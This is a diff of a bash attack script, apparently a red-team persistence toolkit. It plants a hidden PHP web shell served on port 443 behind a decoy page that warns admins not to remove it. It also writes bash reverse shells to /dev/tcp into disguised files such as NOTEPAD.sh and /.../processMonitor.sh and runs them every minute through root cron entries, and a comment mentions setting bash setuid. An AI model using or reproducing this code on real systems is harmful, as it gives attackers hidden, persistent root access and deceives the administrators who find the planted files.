@@ -333,17 +333,18 @@ MaliciousWebServerHTTPS(){
 #make web directory, create a php backdoor, and make it look convincing (index.html, and port 80)
   mkdir /tmp/web
   echo "<?php echo passthru($_GET['cmd']); ?>" > /tmp/web/.phpbackdoor.html
-  echo "<p>This is the default linux web page. Do not remove!<p>" > /tmp/web/index.html
+  echo "<p>This is the default Linux webpage for HTTP/S. If you can see it, everything is working as intended! If you remove, there may be system instability. Do not remove!<p>" > /tmp/web/index.html
   python3 -m http.server --directory /tmp/web 443 &
+  echo "<p>This is the default Linux webpage for HTTP/S. If you can see it, everything is working as intended! If you remove, there may be system instability. Do not remove!<p>" > /index.html
 }
 
 ReverseShellandPersistence(){
-  #create reverse shell
-  echo "bash -i >& /dev/tcp/10.0.0.1/80 0>&1" > /\*/NOTEPAD.sh
-  echo "bash -i >& /dev/tcp/10.0.0.1/443 0>&1" > /\*/processMonitor.sh
-append="* *    * * *   root    /\*/NOTEPAD.sh"
+  #create reverse shells, and have them get executed by cronjobs
+  echo "bash -i >& /dev/tcp/127.0.0.1/80 0>&1" > /\*/NOTEPAD.sh
+  echo "bash -i >& /dev/tcp/127.0.0.1/443 0>&1" > /.../processMonitor.sh
+append="* *    * * *   root    /*/NOTEPAD.sh"
   sudo echo "$append">>"/etc/crontab"
-append="* *    * * *   root    /\*/processMonitor.sh"
+append="* *    * * *   root    /.../processMonitor.sh"
   sudo echo "$append">>"/etc/crontab"
 
   #chmod +s /bin/bash cuz why not
